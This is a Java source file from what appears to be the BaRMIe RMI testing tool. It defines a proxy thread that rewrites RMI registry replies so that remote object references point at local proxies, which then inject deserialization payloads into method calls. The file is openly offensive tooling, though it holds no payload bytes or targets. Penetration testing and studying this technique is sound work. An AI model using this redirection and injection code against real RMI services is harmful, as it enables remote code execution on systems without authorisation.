package nb.barmie.net.proxy.thread;

import java.io.ByteArrayOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.util.ArrayList;
import nb.barmie.net.proxy.RMIMethodCallProxy;
import nb.barmie.util.ProgramOptions;

/***********************************************************
 * A proxy thread class that inspects data returned by an
 * RMI registry service to identify remote object
 * references and redirect them through another proxy that
 * injects raw deserialization payloads into remote method
 * invocation packets.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class ObjectRedirectProxyThread extends ProxyThread {
	/*******************
	 * Properties
	 ******************/
	private final ProgramOptions _options;							//Program options (for socket timeouts)
	private final byte[] _payload;									//The raw payload bytes to inject into remote method invocation packets
	private final byte[] _marker;									//The marker bytes to look for and replace in remote method invocation packets
	private volatile ArrayList<RMIMethodCallProxy> _methodProxies;	//A list of RMI method call proxies that have been started to handle remote method calls
	
	/*******************
	 * Construct the proxy thread.
	 * 
	 * @param srcSocket The source socket.
	 * @param dstSocket The destination socket.
	 * @param options The program options.
	 * @param payload The raw bytes of the deserialization payload that will be injected into proxied method calls.
	 * @param marker The raw bytes of a marker object that will be replaced with the payload in proxied method calls.
	 ******************/
	public ObjectRedirectProxyThread(Socket srcSocket, Socket dstSocket, ProgramOptions options, byte[] payload, byte[] marker) {
		super(srcSocket, dstSocket);
		this._options = options;
		this._payload = payload;
		this._marker = marker;
		this._methodProxies = new ArrayList<RMIMethodCallProxy>();
	}
	
	/*******************
	 * Check for remote object references in data returned by an RMI registry
	 * service and manipulate the references to point at proxies to enable
	 * remote method calls to be intercepted and manipulated.
	 * 
	 * Known remote reference patterns:
	 *	TC_BLOCKDATA	Block len	Str len		Type			Str len		Hostnamee		Port
	 *	0x77			[byte]		0x00 0x0a	"UnicastRef"	[short]		[char*short]	[int]
	 * 
	 *	TC_BLOCKDATA	Block len	Str len		Type			Byte	Str len		Hostname		Port
	 *	0x77			[byte]		0x00 0x0b	"UnicastRef2"	[byte]	[short]		[char*short]	[int]
	 * 
	 * @param data The data received from the source socket.
	 * @return The data to write to the destination socket.
	 ******************/
	public ByteArrayOutputStream handleData(ByteArrayOutputStream data) {
		RMIMethodCallProxy proxy;
		ByteArrayOutputStream outData = new ByteArrayOutputStream();
		StringBuilder sb;
		String refType;
		String hostName;
		String newHost;
		byte[] dataBytes;
		int portNumber;
		int newPort;
		int blockLen;
		int hostLen;
		int i;
		int j;
		
		//Copy data to the output data, replacing remote object references if found
		dataBytes = data.toByteArray();
		for(i = 0; i < dataBytes.length; ++i) {
			//Copy the current byte to the output stream
			outData.write(dataBytes[i]);
			
			//Look for remote object references
			try {
				//Check for TC_BLOCKDATA
				if(dataBytes[i] != 0x77) { continue; }
				
				//Get the block length
				blockLen = dataBytes[i + 1];
				
				//Offset 2 should be 0x00
				if(dataBytes[i + 2] != 0x00) { continue; }
				
				//Get the reference type name
				sb = new StringBuilder(dataBytes[i + 3]);
				for(j = 0; j < dataBytes[i + 3]; ++j) {
					sb.append((char)dataBytes[i + j + 4]);
				}
				refType = sb.toString();
				
				//Check the reference type and get the host data
				if(refType.equals("UnicastRef")) {
					//Get the hostname
					hostLen = (dataBytes[i + 14] << 8) + dataBytes[i + 15];
					sb = new StringBuilder(hostLen);
					for(j = 0; j < hostLen; ++j) {
						sb.append((char)dataBytes[i + j + 16]);
					}
					hostName = sb.toString();
					
					//Get the port number
					portNumber = (int)((dataBytes[i + hostLen + 16] << 24) & 0xff000000) +
									  ((dataBytes[i + hostLen + 17] << 16) &   0xff0000) +
									  ((dataBytes[i + hostLen + 18] <<  8) &     0xff00) +
									   (dataBytes[i + hostLen + 19]        &       0xff);
				} else if(refType.equals("UnicastRef2")) {
					//Get the hostname
					hostLen = (dataBytes[i + 16] << 8) + dataBytes[i + 17];
					sb = new StringBuilder(hostLen);
					for(j = 0; j < hostLen; ++j) {
						sb.append((char)dataBytes[i + j + 18]);
					}
					hostName = sb.toString();
					
					//Get the port number
					portNumber = (int)((dataBytes[i + hostLen + 18] << 24) & 0xff000000) +
									  ((dataBytes[i + hostLen + 19] << 16) &   0xff0000) +
									  ((dataBytes[i + hostLen + 20] <<  8) &     0xff00) +
									   (dataBytes[i + hostLen + 21]        &       0xff);
				} else {
					//Unknown remote object reference type
					continue;
				}
				
				//Attempt to create an RMI method proxy and redirect the remote object through it
				try {
					//Create and start an RMI method call proxy
					proxy = new RMIMethodCallProxy(InetAddress.getByName(hostName), portNumber, this._options, this._payload, this._marker);
					proxy.startProxy();
					
					//Add proxy to list of method call proxies
					this._methodProxies.add(proxy);
					
					//Get the new host and port for the remote object
					newHost = proxy.getServerListenAddress().getHostAddress();
					newPort = proxy.getServerListenPort();
					
					//Work out the new block length
					blockLen = blockLen + (newHost.length() - hostName.length());
					
					//Write the updated remote object reference data out
					outData.write((byte)blockLen);								//Updated TC_BLOCKDATA length
					outData.write((byte)((refType.length() & 0xff00) >> 8));	//Length of reference type string
					outData.write((byte)(refType.length() & 0xff));				//Length of reference type string
					outData.write(refType.getBytes());							//The reference type string
					if(refType.equals("UnicastRef2")) {
						outData.write(dataBytes[i + 15]);						//The byte between "UnicastRef2" and the length of the host name
					}
					outData.write((byte)((newHost.length() & 0xff00) >> 8));	//Length of new host name string
					outData.write((byte)(newHost.length() & 0xff));				//Length of new host name string
					outData.write(newHost.getBytes());							//New host name string
					outData.write((byte)((newPort & 0xff000000) >> 24));		//New port
					outData.write((byte)((newPort &   0xff0000) >> 16));		//New port
					outData.write((byte)((newPort &     0xff00) >>  8));		//New port
					outData.write((byte) (newPort &       0xff));				//New port
					
					//Update i to skip over the data that has just been replaced
					i = i + hostName.length() + 19;
					if(refType.equals("UnicastRef2")) {
						i = i + 2;
					}
				} catch(Exception ex) {
					//Print exception details
					System.out.println("[-] An exception occurred whilst starting an RMI method call proxy.\n\t" + ex.toString());
				}
			} catch(IndexOutOfBoundsException ex) {
				//Out of bound access, probably not a remote object reference, continue
				continue;
			}
		}
		
		//Return the new data stream
		return outData;
	}
	
	/*******************
	 * Shutdown the proxy thread.
	 * 
	 * @param force Set to true to force immediate shutdown.
	 ******************/
	public void handleShutdown(boolean force) {
		//Shutdown all RMI method call proxies
		for(RMIMethodCallProxy proxy: this._methodProxies) {
			proxy.stopProxy(force);
		}
		this._methodProxies.clear();
	}
}
